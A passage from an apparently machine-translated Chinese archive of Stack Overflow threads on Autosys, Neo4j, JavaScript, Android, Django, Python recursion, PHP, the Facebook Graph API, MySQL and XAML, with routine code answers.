现在，在这种情况下，调查 tnsnames.ora 文件并确保其中包含数据库名称。这可能是数据库连接失败的原因之一。完成此操作后，您应该从上一个命令中获得以下输出。

```
<AutosysCommandPrompt>: autoping -m WindowsMachineName -D

AutoPinging Machine [WindowsMachineName]  AND checking the Remote Agent's DB Access.
  AutoPing WAS SUCCESSFUL! 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-04T02:01:26.237

最好的检查方法是将作业命令更改为执行“路径”，将用户权限与您在命令行中使用的用户进行比较。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-06T13:25:17.577

您可以从 Autosys 守护程序日志文件中获取一些更有用的调试信息。它通常位于 Autosys 代理安装路径下的 tmp 文件夹内（例如 C:\Program Files (x86)\CA\UnicenterAutoSysJM.DEV\tmp）。您将需要浏览此文件夹中的所有文件，以找到与您正在寻找的特定工作相对应的文件。

此文件包含 Autosys 代理用于启动程序的实际命令以及 Autosys 设置的其他环境变量。

# neo4j - Neo4j 节点属性类型

> ID：10239709
> 
> 赞同：11
> 
> 时间：2012-04-20T03:07:27.757
> 
> 标签：neo4j, graph-databases

我在玩 neo4j，我想知道，`type`在节点上有一个属性来指定它是什么类型的节点是否很常见？我已经尝试搜索这种做法，并且我看到有些人将`name`其用于这样的目的，但我想知道这是否被认为是一种好的做法，或者索引是否会是更实用的方法？

一个示例是“用户”节点，它的类型为：`user`，这样如果索引不好，我就可以进行全节点扫描并查找`user`.

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-12-06T18:24:26.447

[标签](http://www.neo4j.org/develop/labels)已添加到 neo4j 2.0。他们解决了这个问题。

您可以创建带有标签的节点：

```
CREATE (me:American {name: "Emil"}) RETURN me; 
```

您可以在标签上匹配：

```
MATCH (n:American)
WHERE n.name = 'Emil'
RETURN n 
```

您可以在节点上设置任意数量的标签：

```
MATCH (n)
WHERE n.name='Emil'
SET n :Swedish:Bossman
RETURN n 
```

您可以删除节点上任意数量的标签：

```
MATCH (n { name: 'Emil' })
REMOVE n:Swedish 
```

ETC...

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-21T03:50:35.090

没错，它确实取决于您的用例。如果您添加一个类型属性，然后希望找到所有用户，那么您可能会遇到麻烦，因为您必须检查每个节点上的该属性才能找到用户。在这种情况下，索引可能会做得更好——但在您需要查询索引中没有条件和关系的所有用户的情况下（当然，除非您的索引是“开始”的来源）。如果您有像我这样的图表，其中关系类型意味着两种不同的节点类型，如 A-(knows)-(B) 并且 A 或 B 可以是用户或客户，那么它就行不通了。

因此，您的用例非常重要 - 对图形进行通用建模很容易，但根据您的使用模式“调整”它很重要。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-20T05:40:58.290

恕我直言，您不必在节点上放置类型属性。相反，引用特定“类型”的所有节点的常用方法是将所有用户节点连接到可能称为“用户”的节点。这样从用户节点开始，您可以很容易地找到所有用户节点。“用户”节点本身可以​​被索引，以便您可以轻松找到它，或者它可以连接到参考节点。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-20T18:39:48.103

我认为这真的取决于你。有些人喜欢索引类型属性，但我发现当您有其他索引属性来缩小索引命中的数量（例如，搜索所有 21 岁以上的用户）时，它们最有用。

也就是说，正如@Luanne 指出的那样，我们大多数人都试图首先解决图中的问题。另一种方法（我认为更自然的方法）是使用关系类型来推断实际的节点类型，即“A - (knows) -> B”，所以 A 必须是用户或其他一些可以“知道”的事物，B 必须是另一个用户、主题或其他可以“知道”的对象。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-04-23T00:14:16.107

对于客户端 API，将元素类型建模为属性可以很容易地在客户端代码中实例化正确的域对象，因此我总是在每个节点/顶点上包含一个类型属性。

“type” var 名称通常用于此目的，但在 Python 等某些语言中，“type”是保留字，因此我在 Bulbs ( [http://bulbflow.com/quickstart/#models](http://bulbflow.com/quickstart/#models) ) 中使用“element_type”。

边缘/关系不需要这，因为它们已经包含一个类型（标签）——请注意，Neo4j 还使用关键字“类型”而不是标签来表示关系。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-26T12:14:26.827

我会说这是常见的做法。例如，这正是 Spring Data Neo4j 如何知道某个节点是哪个实体类型的方式。每个节点都有“ **type** ”属性，其中包含实体的限定类名。这些属性在“**类型**”索引中自动索引，因此可以非常快速地查找节点。您可以完全像这样实现您的用例。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-09-27T01:21:31.283

标签最近被添加到 Neo4j 2.0 ( [http://docs.neo4j.org/chunked/milestone/graphdb-neo4j-labels.html](http://docs.neo4j.org/chunked/milestone/graphdb-neo4j-labels.html) )。它们目前仍在开发中，但它们解决了这个确切的问题。

# javascript - 如何使这段代码更有用（防止文本区域中的特殊字符）

> ID：10239711
> 
> 赞同：1
> 
> 时间：2012-04-20T03:07:32.307
> 
> 标签：javascript, jquery

我正在使用这段代码并且工作正常，但这段代码的问题是，它没有优化，例如，如果我想添加更多字符，那么我最终会得到 ifs....

```
if (keychar == "#" || keychar == "!" || keychar == "$" ..........) 
```

有没有办法优化这段代码？意味着更少的 ifs（如果我需要添加更多特殊字符来防止）

```
 <script language="javascript" type="text/javascript">
        function check(e) {
            var keynum
            var keychar
            var numcheck
            // For Internet Explorer
            if (window.event) {
                keynum = e.keyCode
            }
            // For Netscape/Firefox/Opera
            else if (e.which) {
                keynum = e.which
            }
            keychar = String.fromCharCode(keynum)
            //List of special characters you want to restrict
            if (keychar == "'" || keychar == "a") {

                return false;
            }
            else {
                return true;
            }
        }
</script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:08:46.443

```
switch(keychar) {
    case "#":
    case "!":
    case "$":
       ...
    default:
       ...
} 
```

或者

```
if( keychar.match(/[#!$]/)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:08:58.077

在字符串中定义要限制的字符列表，并搜索使用 输入的键[**`indexOf`**](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/String/indexOf)。

```
keychar = String.fromCharCode(keynum);
return "'a#!$".indexOf(keychar) == -1; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:32:54.467

```
function check(e) {
    var event = e || window.event;
    var keychar = String.fromCharCode(event.keyCode);
    switch(keychar) {
        case 'a':
        case 'b':
        case 'c':
        /*
         * case 'd':
         * case 'e':
         * ...
         */
            return false;
        default:
            return true;
    } 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-25T07:05:15.620

如何使用jquery限制文本框中的特殊字符

```
 $("#txtUploadFrequency").keypress(function (e) {
    if (String.fromCharCode(e.keyCode).match(/[^0-9A-Za-z]/g)) return false;
});`enter code here` 
```

# android - Android+我只需要显示 facebook??@share Intent 对话框列表

> ID：10239712
> 
> 赞同：0
> 
> 时间：2012-04-20T03:07:50.173
> 
> 标签：android

Android+我只需要在共享意图中显示 Facebook 列表项，而不是几个共享应用程序的所有列表..可以做到吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:31:26.527

您可以使用 Facebook SDK 并直接调用它，而不是使用共享意图。

[https://developers.facebook.com/docs/reference/androidsdk/dialog/](https://developers.facebook.com/docs/reference/androidsdk/dialog/)

[安卓 facebook api 帖子](https://stackoverflow.com/questions/4093618/android-facebook-api-post)

# python - Django 用户身份验证和呈现由该特定用户创建的内容？

> ID：10239713
> 
> 赞同：1
> 
> 时间：2012-04-20T03:07:50.487
> 
> 标签：python, django, authentication

我正在创建一个非常简单的待办事项列表应用程序。每个用户都应该有一个具有基本 CRUD 功能的关联待办事项列表页面。这意味着*User A应该具有与**User B*不同的数据。

到目前为止，谁拥有待办事项列表没有区别。任何登录的人都可以添加、删除、显示、删除任务。

我有一种直觉，我可能需要在我的模型和模板中添加一些额外的东西。我应该提到我使用的是 Pinax 0.9a2。如果它完成了我需要它做的事情，我更愿意使用该解决方案。

**这是我的models.py**

```
class Task(models.Model):
    name = models.CharField(max_length=100)
    added_at = models.DateTimeField(auto_now_add=True)
    last_update = models.DateTimeField(auto_now=True)

    def __unicode__(self):
        return self.name 
```

**这是我在views.py中的一种形式**

```
def task_create(request):
    return create_object(request,
        model=Task,
        template_name='task_create.html',
        post_save_redirect=reverse("todo_list")
    ) 
```

**这是我的两个模板：**

***待办事项创建***

```
 <form action="" method="post">{% csrf_token %}
        {{ form.name }}
        <button type="submit" class="btn primary">Create &rarr;</button>
    </form> 
```

**待办事项清单**

```
{% if task_list %}
    <p><a href="{% url task_create %}">Create a task</a></p>
    <ul>
    {% for task in task_list %}
        <li><a href="{% url task_detail task.id %}">{{ task.name }}</a></li>
    {% endfor %}
    </ul>
    {% else %}
        <p>No tasks to display, click to <a href="{% url task_create %}">create new</a>.</p>
    {% endif %} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T03:48:06.363

所以你只想给它添加访问控制？

1.  添加`ForeignKey`到`auth.User`您的 ToDos 模型
2.  重写您的列表并创建视图以使其手动工作（您可以使用基于类的新视图来实现您的目标，但您需要先了解它们是如何工作的）
3.  在列表视图中为查询集添加过滤器
4.  提供`commit=False`给您的表单`save()`，为检索到的对象设置用户并手动保存

代码：

```
class Task(models.Model):
    user = models.ForeignKey('auth.User')
    name = models.CharField(max_length=100)
    added_at = models.DateTimeField(auto_now_add=True)
    last_update = models.DateTimeField(auto_now=True)

class TaskForm(forms.ModelForm):
    class Meta:
        model = Task
        exclude = ['user', ]

def task_create(request):
    form = TaskForm(data=request.POST or None)
    if request.method == 'POST' and form.is_valid():
        task = form.save(commit=False)
        task.user = request.user
        task.save()
        return reverse("todo_list")
    return render(request,
        'task_create.html',
        {'form': form}
    ) 
```

另外，在列表视图中添加过滤，`request.user`我建议使用`@login_required`装饰器来避免非授权用户添加任务。

# python - 为什么会出现这种输出？

> ID：10239716
> 
> 赞同：2
> 
> 时间：2012-04-20T03:08:10.603
> 
> 标签：python

```
def function(s):
 if len(s) == 1:
    print s[0],
 else:
    function(s[1:])
    print s[0], 
```

`function("1234")`最终打印`4 3 2 1`

为什么会这样？在函数中，显然不满足第一个条件。在 else 条件下，`s[1:]`放入 for s，但它的长度不是 1。我只是看不到外面的任何东西`s[0]`会如何打印到屏幕上。该函数中没有任何内容看起来像是 print `s[1:]`，更不用说反向了。我很困惑。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-20T03:10:59.907

```
>>> def function(s):
...     print 's is currently %r' % s
...     if len(s) == 1:
...         print s[0],
...     else:
...         function(s[1:])
...         print s[0],
... 
>>> function("1234")
s is currently '1234'
s is currently '234'
s is currently '34'
s is currently '4'
4 3 2 1 
```

这是一个递归函数，它在打印 s[0] 之前再次调用自身，因此它打印出的项目被反转。

这是一个可能更有帮助的示例。

```
>>> def function(s):
...     print 's is currently %r' % s
...     if len(s) > 1:
...         print 'calling function again with %r as s' % s[1:]
...         function(s[1:])
...     print s[0],
... 
>>> function('1234')
s is currently '1234'
calling function again with '234' as s
s is currently '234'
calling function again with '34' as s
s is currently '34'
calling function again with '4' as s
s is currently '4'
4 3 2 1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:10:04.710

这是一种递归情况，您正在使用原始输入的越来越短的子字符串一遍又一遍地调用函数本身，直到它是长度为 1 的字符串（原始输入中的最后一个），在这种情况下它开始打印它然后“展开”并反向打印字符串的其余部分。

看看这个带注释的代码：

```
def function(s):
    if len(s) == 1:
        print 'single:', s[0],  # (A) this is where your first output is generated for a single character
    else:
        print 'calling function again with ',s[1:]
        function(s[1:]) # (B) you call function again, i.e., your recursive call
        print ' unwind->', s[0], # (C) the "unwinding" step, i.e, finish the rest
                                 # of the function when you return from the recursive call 
```

你得到的输出是：

```
calling function again with 234
calling function again with 34
calling function again with 4
single: 4  unwind-> 3  unwind-> 2  unwind-> 1 
```

第一次调用该函数时，您直接进入`else`子句并在 (B) 行中再次调用该函数，但这次使用“234”。现在函数再次启动，但使用“234”，您再次进入`else`并再次调用函数，但现在使用“34”，函数再次运行，现在您再次进入`else`并仅使用“4”调用函数" .. 这次因为它的长度为 1，所以你打印它（A 行）。

现在您从这个函数返回（展开过程） - 并从您进行递归调用之前的位置恢复，并通过打印当前剩余字符的第一个字符（行 C）反向打印字符串的其余部分.

第一次遇到递归可能很难掌握——这很正常。在某些时候，它会点击并变得清晰。您可能想阅读一些关于一般概念的内容并搜索一些清晰的注释示例（大多数 CS/编程书籍都会有一些）。

这是一个简短的 YouTube 视频，通过一个简单的示例解释了 Python 中的递归，希望对您有所帮助：[http ://www.youtube.com/watch?v=72hal4Cp_2I](http://www.youtube.com/watch?v=72hal4Cp_2I)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T03:13:45.957

尝试像这样修改函数：

```
def function(s):
   print 'Called with {}'.format(s)
   if len(s) == 1:
      print s[0]
   else:
      function(s[1:])
      print s[0] 
```

并运行它。您会看到，每次您击球时，`function(s[1:])`您都会暂停该“运行”并在现在暂时暂停`function()`的内部开始新的运行。`function()`新调用`function()`使用字符串的缩短版本。最终，它只用一个字符调用，并且你达到了第一个条件。

从内部调用函数称为*递归*。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T03:18:46.927

让我们看看工作中的递归。

*   首先你用 s="1234" 调用函数
*   len(s) = 4 所以你选择 else
*   您使用或“234” **递归**调用函数`s[1:]`
    *   现在，您可以使用 s="234"
    *   len(s) = 3 所以你选择 else
    *   `s[1:]`您使用或“34” 递归调用函数
        *   现在，您可以使用 s="34"
        *   len(s) = 2 所以你选择 else
        *   `s[1:]`您使用或“34” 递归调用函数
            *   现在，您可以使用 s4"
            *   len(s) = 1 所以你做 if 和打印的第一部分，`s[0]`即 4
            *   你回来
        *   返回上一个调用 (s="34") 你 print `s[0]`，即 3
        *   你回来
    *   返回上一个调用 (s="234") 你 print `s[0]`，即 2
    *   你回来
*   CReturning to previous call (s="1234") you print `s[0]`，即 1
*   你回来

# php - 预加载图片进行刷新、缓存

> ID：10239717
> 
> 赞同：-1
> 
> 时间：2012-04-20T03:08:30.903
> 
> 标签：php, javascript, html, caching

我有这两个 php 变量：`$img1src`和`$img2src`,（它们是 PHP 无关紧要，因为您可以在任何地方回显 php 变量）它们都包含图像的 URL。我想知道我是否能够预加载这些图像，或者缓存它们。

我的目标是：当有人***刷新***页面时，我希望这些图片立即出现在`<img src >`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:59:48.790

我不会提供具体的代码，因为我不想给你一条鱼，而是想展示google是如何成为鱼竿的。

我用谷歌搜索`"php cache images tutorial"`只是想看看会发生什么。下面是一个很好的资源。

[http://dtbaker.com.au/random-bits/how-to-cache-images-generated-by-php.html](http://dtbaker.com.au/random-bits/how-to-cache-images-generated-by-php.html)

没有比这更好的了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:09:56.553

当然可以，试试这个`javascript`：

```
var image1 = new Image(), image2 = new Image();
image1.src = <?php echo $img1src; ?>;
image2.src = ?<php echo $img2src; ?>; 
```

`img`这应该预加载图像，因此当您将标签附加到`DOM`图像时应该立即出现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:32:49.507

缓存图像并不是 PHP 真正的工作。应该使用 PHP 来决定是否显示它。（您可以使用 PHP 进行缓存操作，但意义不同。）本质上，您想要做的是让客户端浏览器请求第二个图像。一旦浏览器获得图像，它应该自动在标题中发送一个“if-modified-by”参数。下次加载页面时，响应代码应为 304，并且您的图像应立即加载。您可以从多种方式中进行选择。在页面加载后使用 javascript 加载图像（以防止额外的加载时间），或者您可以只包含隐藏在页面某个位置的图像标记。

我也没有测试过，但您也许可以直接向图像发送 ajax 请求。我不确定这种方式是否会缓存它。

编辑：这不是最优雅的解决方案，但它应该让这个想法得到理解。

JS 示例：

```
<?php
session_start();
if (!isset($_SESSION['graphic'])) $_SESSION['graphic'] = "http://www.tomsfreelance.com/laptop/DSC_0011.JPG";
else $_SESSION['graphic'] = "http://www.tomsfreelance.com/laptop/DSC_0012.JPG";
?>
<html>
<head>
<script>
function loadImage() {
    document.getElementById('preload').style.backgroundImage = "url(http://www.tomsfreelance.com/laptop/DSC_0012.JPG)";
}
</script>
</head>
<body onload="loadImage();">
<div id="preload" style="display: none;"></div>
<img src="<?php echo $_SESSION['graphic'];?>">
</body>
</html> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T03:35:37.913

如果您的目标是总体上减少 http 请求：您可以尝试显示这些图像的[CSS Sprites](http://css-tricks.com/css-sprites/)和/或[Data Url](http://dataurl.net/#about)方法。当图像较小时，这些方法将是最有效的。

# php - PHP SCRIPT 也应该上传图片及其描述

> ID：10239719
> 
> 赞同：2
> 
> 时间：2012-04-20T03:08:53.870
> 
> 标签：php, facebook, facebook-graph-api, facebook-php-sdk

以下是我的脚本，我想用它来更新我的 facebook fanpage 上的状态，但它无法以无法在 facebook fanpage 的画廊中查看上传的图像的方式工作，请查看此链接（[http://radiations3.com /damn.jpg](http://radiations3.com/damn.jpg)）它是我的脚本到底发生了什么以及我试图从我的脚本中做什么/想要做什么的详细截图。请让我知道我的脚本有什么问题，我应该怎么做？

```
 <?php

require 'src/facebook.php';

$app_id = "332267477347";
$app_secret = "xxxxxxxx";

$facebook = new Facebook(array(
 'appId' => $app_id,
 'secret' => $app_secret,
 'cookie' => true,
 'fileUpload' => true,

));

$facebook->setFileUploadSupport(true);  

$user = $facebook->getUser();
//echo $user;

if(($facebook->getUser())==0)
{
 header("Location:{$facebook->getLoginUrl(array('scope' => 'photo_upload,user_status,publish_stream,user_photos,manage_pages'))}");
 exit;
}
else {
$accounts_list = $facebook->api('/me/accounts');
echo "i am connected";
}
  $valid_files = array('image/jpeg', 'image/png', 'image/gif');

//to get the page access token to post as a page
foreach($accounts_list['data'] as $account){
      if($account['id'] == 194458563914948){      // my page id =123456789
        $access_token = $account['access_token'];
        echo "<p>Page -- Access Token: $access_token</p>";
        }
    }

//posting to the page wall

if (isset($_FILES) && !empty($_FILES))
{  
$folder = "pak/".$_FILES['pic']['name'];
$fold = 'http://snowdrop.com.pk/fb/'.$folder;
echo $fold."<br>";
if( move_uploaded_file($_FILES['pic']['tmp_name'], $folder) )
{
#Upload photo here
  $img = realpath($_FILES["pic"]["tmp_name"]);
$attachment = array('message' => $_POST['textfield'],
                             'picture' => $fold,
                                'access_token' => $access_token,

                );
$status = $facebook->api("/194458563914948/feed", 'post', $attachment);

echo $status;
var_dump($status);

 }
 else{
    echo 'Only jpg, png and gif image types are supported!';

}
}
?>
<body>
 <!-- Form for uploading the photo -->
 <div class="main">
  <p>Select a photo to upload on Facebook Fan Page</p>
  <form method="post" action="" enctype="multipart/form-data">
  <p>Select the image: <input type="file" name="pic" />
    <br />
    <label>Description
    <input type="text" name="textfield" id="textfield" />
    </label>
  </p>
  <p><input class="post_but" type="submit" value="Upload to my album" /></p>
  </form>
 </div>
</body> 
```

![我的脚本正在做什么以及我想要什么的详细图像](../Images/54ed645e933f96a4f5c68c1f40dbdfae.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T04:11:10.907

要获得您正在寻找的效果，您需要上传到专辑 ID。在下面的代码中，只需添加您要上传到的专辑 ID。

* * *

```
$status = $facebook->api("/Album_ID/photos", 'post', $attachment); 
```

* * *

```
<?php

require 'src/facebook.php';

$app_id = "332267477347";
$app_secret = "xxxxxxxx";

$facebook = new Facebook(array(
 'appId' => $app_id,
 'secret' => $app_secret,
 'cookie' => true,
 'fileUpload' => true,

));

$facebook->setFileUploadSupport(true);  

$user = $facebook->getUser();
//echo $user;

if(($facebook->getUser())==0)
{
 header("Location:{$facebook->getLoginUrl(array('scope' => 'photo_upload,user_status,publish_stream,user_photos,manage_pages'))}");
 exit;
}
else {
$accounts_list = $facebook->api('/me/accounts');
echo "i am connected";
}
  $valid_files = array('image/jpeg', 'image/png', 'image/gif');

//to get the page access token to post as a page
foreach($accounts_list['data'] as $account){
      if($account['id'] == 194458563914948){      // my page id =123456789
        $access_token = $account['access_token'];
        echo "<p>Page -- Access Token: $access_token</p>";
        }
    }

//posting to the page wall

if (isset($_FILES) && !empty($_FILES))
{  
$folder = "pak/".$_FILES['pic']['name'];
$fold = 'http://snowdrop.com.pk/fb/'.$folder;
echo $fold."<br>";
if( move_uploaded_file($_FILES['pic']['tmp_name'], $folder) )
{
#Upload photo here
  $img = realpath($_FILES["pic"]["tmp_name"]);
$attachment = array('message' => $_POST['textfield'],
                             'source' => $fold,
                                'access_token' => $access_token,

                );
$status = $facebook->api("/Album_ID/photos", 'post', $attachment);

echo $status;
var_dump($status);

 }
 else{
    echo 'Only jpg, png and gif image types are supported!';

}
}
?>
<body>
 <!-- Form for uploading the photo -->
 <div class="main">
  <p>Select a photo to upload on Facebook Fan Page</p>
  <form method="post" action="" enctype="multipart/form-data">
  <p>Select the image: <input type="file" name="pic" />
    <br />
    <label>Description
    <input type="text" name="textfield" id="textfield" />
    </label>
  </p>
  <p><input class="post_but" type="submit" value="Upload to my album" /></p>
  </form>
 </div>
</body> 
```

# mysql - (MYSQL) SQL 选择查询 - 也许是 OUTER JOIN？

> ID：10239721
> 
> 赞同：0
> 
> 时间：2012-04-20T03:09:07.470
> 
> 标签：mysql, sql, select

我正在为一些 sql 苦苦挣扎，可以使用一些帮助。我相信这对很多人来说都是新手。

**这是一个示例：** 当提供了albuid 时，我正在尝试选择不在相册中的所有图片。

**桌子**

**图片表**

```
 pictureid
    picturename 
```

**相册_图片关联表**

```
 albumpictureid
    albumid
    pictureid 
```

**专辑表**- 我认为不需要在 SQL 中引用此表。

```
 albumid
    albumname 
```

我正在为相册分配图片，并且只想显示尚未分配的图片。

**额外的功劳：**如果我可以选择表中的所有图片并且能够知道哪些图片已经在相册中，而不是从返回的数据中忽略它们，那就更好了。然后我仍然可以显示图像，只是不允许分配它。

希望一切都说得通。感谢您的任何帮助。

使用 MYSQL 5

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:12:17.550

`album_picture`对于您的第一个问题，此查询将返回您的关联表中没有关联的图片。

```
 SELECT 
    * 
  FROM 
    pictures 
  WHERE 
    pictureid NOT IN (SELECT pictureid FROM album_picture) 
```

返回两者的一种简单方法是添加另一列，执行两个查询（一个给您分配的图片，一个给您未分配的图片），并获得两者的并集。

```
 (SELECT pictures.*, 'n' AS `assigned` .... ) UNION (SELECT pictures.*, 'y' AS `assigned` ...) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:13:07.440

您可以通过以下方式找到*不在*相册中的图片：

```
select pictureid from Album_Picture where albumid != :albumid 
```

您可以使用以下方式标记相册中的内容：

```
select pictureid, albumid=:albumid as in_album from Album_Picture 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T03:15:10.547

让我们尝试创建一个显示每张图片及其相关相册的结果表来解决此问题。由于左外连接，没有相册的图片的相册信息将具有空值。ORDER BY 语句会将所有空值放在一起。

```
select p.pictureid, p.picturename, a.albumid, a.albumname
from picture p
    left outer join album_picture ap
    on p.pictureid = ap.pictureid
        left outer join album a
        on ap.albumid = a.albumid
order by a.albumid 
```

# android - 如何从另一个活动启动 Android AppWidget 的配置活动？

> ID：10239728
> 
> 赞同：4
> 
> 时间：2012-04-20T03:10:58.487
> 
> 标签：android, configuration, android-appwidget

好吧，这让我发疯了。我开发了一个应用程序小部件。一切正常。

我有一个配置活动，每次在主屏幕上添加一个小部件时都会启动它并且工作得很好。我保存每个小部件 ID 等的用户设置。

该小部件有一些按钮，其中一个启动一个带有关于信息的活动，即“关于活动”。

“关于活动”有一个按钮，我想用它来启动启动“关于活动”的小部件 id 的配置活动。我想这样做的原因是因为我希望用户能够配置我的小部件的任何实例的内容，而无需将其删除并再次添加（以启动配置活动）。

配置活动需要 AppWidgetManager.EXTRA_APPWIDGET_ID 才能完成工作（保存此特定 widgetid 的用户设置），因此当我从另一个活动调用它时，我必须以某种方式传递这个额外内容。显而易见的想法是：

```
startActivity(new Intent(context,act_configure.class).putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, ??? )); 
```

现在我的问题是widgetid在哪里？我找到了一百万种获取widgetids（数组）的方法，但没有一条关于如何获取启动“关于活动”的特定widgetid的线索

任何有关这方面的帮助都会使我花在寻找解决方案上的时间变得有价值。先感谢您。

ps 请原谅我的英语，因为它们不是我的母语...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:32:18.767

感谢 Cory Chaltron，这是我的问题的解决方案。

在小部件提供程序的 onUpdate 方法中，我应该创建一个“唯一”意图传递给处理 about 活动启动的待处理意图。由于 Android 比较 Intent 的方式，在 extras 中传递 WidgetID 是不够的，您还应该将其作为数据传递给 Intent 以便唯一。所以这里是代码：

```
Intent aboutIntent = new Intent(cx, act_about.class);
aboutIntent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, widgetIds[i]);
// Make this unique for this appWidgetId
aboutIntent.setData(Uri.withAppendedPath(Uri.parse("customuri://widget/id/"), String.valueOf(widgetID)));
PendingIntent aboutPendingIntent = PendingIntent.getActivity(cx, 0, aboutIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK), PendingIntent.FLAG_UPDATE_CURRENT);
views.setOnClickPendingIntent(R.id.cmdabout, aboutPendingIntent) 
```

尽管我回答了自己的问题，但我不接受它，因为它是基于 Cory 的回答。谢谢大家的帮助...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T02:26:53.603

您如何设置小部件视图？我有一个应用程序，我在其中迭代活动小部件并在`RemoteView`那里配置设置。您可以在附加到“关于”按钮的 onClick 中设置小部件 ID。

```
final AppWidgetManager widgetManager = AppWidgetManager.getInstance(this);
final ComponentName widgetName = new ComponentName(this, WidgetProvider.class);

final int[] widgetIds = widgetManager.getAppWidgetIds(widgetName);

for (int widgetId : widgetIds) {
    final RemoteViews remoteViews = new RemoteViews(getPackageName(), R.layout.widget);

    // This is the important part :-D
    remoteViews.findViewById(R.id.your_about_button).setOnClickListener(... a listener to start your about activity that puts the widget id in the extra like you suggest in your question ...);

    widgetManager.updateAppWidget(widgetId, remoteViews);
} 
```

# php - 如何根据查询中的某些条件添加 suctom 列

> ID：10239730
> 
> 赞同：1
> 
> 时间：2012-04-20T03:11:20.030
> 
> 标签：php, mysql

我有 ship hom 数据库，我想从我的 ship 表中选择数据，其中包含基于某个值的自定义列：

```
shipid    shipname   capacity   hullnum  
5476      Alin       2540000    475
7655      star       3340000 
```

我必须检查 hull num 下是否存在任何数字，然后它是 hullbuilder 否则为 shipbuilder （硬编码文本）。

我是mysql的新手。请帮我怎么做

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:13:44.413

您可以`if /else`在 select 子句中使用 simple 。

如下所示：

```
SELECT shipid,shipname,capacity,
    if(hullnum is not NULL OR hulnum!='','hullbuilder','shipbilder') as builder
  FROM ship 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:21:10.473

这也可以通过`CASE`语句来完成：

```
SELECT shipid, shipname, capacity,
  CASE WHEN COALESCE(hullnum, '') != ''
      THEN 'hullbuilder'
      ELSE 'shipbuilder'
   END as builder
  FROM ship 
```

# c# - 如何在 XAML 中为 CollectionView 中的第一个元素设置特定样式？

> ID：10239731
> 
> 赞同：1
> 
> 时间：2012-04-20T03:11:37.380
> 
> 标签：c#, xaml, windows-8, microsoft-metro

我看到 Metro 风格的应用程序，我意识到 CollectionView 的第一个元素中的 XAML 风格与其他风格有不同的风格。

检查这个例子。

![在此处输入图像描述](../Images/6cb0efbcb92b3cae7770007154b83c0b.png)

我只是知道如何为 XAML 中的第一个元素设置不同的样式？我在想，我是否需要实现转换器来做到这一点？还是创建模板？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T04:11:17.007

我认为你可以做这样的事情，作为绑定到自定义对象的模板，该对象公开数据绑定的各种属性（或 ViewModel，无论你的 WinRT 船是否漂浮）

![在此处输入图像描述](../Images/9adba969c40890c43484dc7685f58b14.png)

```
<ScrollViewer>
    <Grid Background="{StaticResource ApplicationPageBackgroundBrush}">
        <Grid.RowDefinitions>
            <RowDefinition/>
            <RowDefinition/>
            <RowDefinition/>
            <RowDefinition/>
        </Grid.RowDefinitions>
        <Grid.ColumnDefinitions>
            <ColumnDefinition/>
            <ColumnDefinition/>
            <ColumnDefinition/>
            <ColumnDefinition/>
            <ColumnDefinition/>
            <ColumnDefinition/>
        </Grid.ColumnDefinitions>

        <TextBlock Grid.Row="0" Grid.Column="0" Grid.ColumnSpan="3" Grid.RowSpan="3" Text="First" FontSize="288"/>
        <TextBlock Grid.Row="3" Grid.Column="0" Text="Second" FontSize="70"/>
        <TextBlock Grid.Row="3" Grid.Column="1" Text="Third" FontSize="70"/>
        <TextBlock Grid.Row="3" Grid.Column="2" Text="Fourth" FontSize="70"/>
        <TextBlock Grid.Row="0" Grid.Column="3" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="1" Grid.Column="3" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="2" Grid.Column="3" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="3" Grid.Column="3" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="0" Grid.Column="4" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="1" Grid.Column="4" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="2" Grid.Column="4" Text="Blah" FontSize="70"/>
        <TextBlock Grid.Row="3" Grid.Column="4">
                <Run FontSize="70">Moar</Run>
                <LineBreak/>
                <Run FontSize="20">Ommm nom nom</Run>
                <LineBreak/>
                <Run FontSize="10">blah blah blah</Run>
        </TextBlock>
    </Grid>
